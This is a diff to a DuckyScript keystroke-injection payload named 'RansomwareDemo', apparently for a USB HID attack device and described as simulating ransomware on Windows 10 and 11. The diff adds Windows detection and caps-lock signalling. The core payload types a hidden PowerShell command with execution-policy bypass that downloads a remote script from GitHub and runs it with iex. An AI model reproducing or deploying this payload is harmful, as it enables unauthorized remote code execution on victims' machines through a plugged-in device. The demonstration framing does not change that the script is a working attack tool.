@@ -1,12 +1,43 @@
-REM     Title: RansomwareDemo
-REM     Author: Marco Spies
-REM     Description: This payload simulates a Ransomware attack on a windows machine.
-REM     Target: Windows 10/11
+REM_BLOCK DOCUMENTATION
+    Title: RansomwareDemo
+    Author: Marco Spies
+    Description: This payload simulates a Ransomware attack on a windows machine.
+    Target: Windows 10,11
+END_REM    
 
 ATTACKMODE HID
-
-REM Run payload
 LED_R
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+EXTENSION WINDOWS_ONLY
+    IF (($_OS == WINDOWS) == FALSE) THEN
+        ATTACKMODE STORAGE
+        STOP_PAYLOAD
+    END_IF
+END_EXTENSION
+
+SAVE_HOST_KEYBOARD_LOCK_STATE
+REM Deactivates CAPSLOCK
+IF ($_CAPSLOCK_ON == TRUE)
+    CAPSLOCK
+END_IF
 
 REM Execute Powershell script
 DELAY 200
@@ -15,10 +46,16 @@ DELAY 200
 STRING powershell -w h -NoP -NonI -ep Bypass iex (iwr "https://github.com/V4T3X/RansomwareDemo/raw/main/r.ps1").Content
 ENTER
 
-DELAY 10000
-ATTACKMODE STORAGE
+DEFINE #driveLabel DUCKY
+DEFINE #numBlinks 10
+
+DELAY 5000
 LED_G
-
-
-- Capslock indikator für ende
-- Windows check
+VAR $i = 0
+WHILE ( $i < #numBlinks )
+    DELAY 150
+    CAPSLOCK
+    $i = ( $i + 1 )
+END_WHILE
+RESTORE_HOST_KEYBOARD_LOCK_STATE
+ATTACKMODE STORAGE
